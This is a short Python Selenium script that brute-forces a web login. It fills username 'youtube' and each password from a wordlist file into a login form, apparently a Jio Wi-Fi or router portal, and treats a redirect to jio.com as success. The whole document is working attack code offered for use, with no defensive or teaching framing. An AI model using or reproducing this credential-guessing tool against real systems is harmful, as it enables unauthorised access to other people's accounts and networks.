from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
pass_list = list(open('test.txt', 'r'))  # File containing passwords, you can also use the other text file as well
weblink=str(input("Enter very recent url:"))
driver = webdriver.Chrome()
driver.get(weblink)
length=len(pass_list)
for n in pass_list:
    password = n.strip()
    n=pass_list.index(n)+1
    action=ActionChains(driver)
    # find username input field and insert username
    driver.find_element(By.CLASS_NAME, "fel").find_element(By.ID, "ft_un").clear()
    driver.find_element(By.CLASS_NAME, "fel").find_element(By.ID, "ft_un").send_keys("youtube")
    # find password input field and insert password
    driver.find_element(By.ID, "ft_pd").clear()
    driver.find_element(By.ID, "ft_pd").send_keys(password)
    action.send_keys(Keys.ENTER)
    action.perform()

    a = driver.current_url

    if a == weblink:
        print("User youtube and password " + password + " combo FAILED")
    if a== "https://www.jio.com":
        print("User 'youtube' and password '" + password + "' combo SUCCEEDED")
        break
    else:
        print("User 'youtube' and password '" + password + "' combo FAILED")

driver.quit()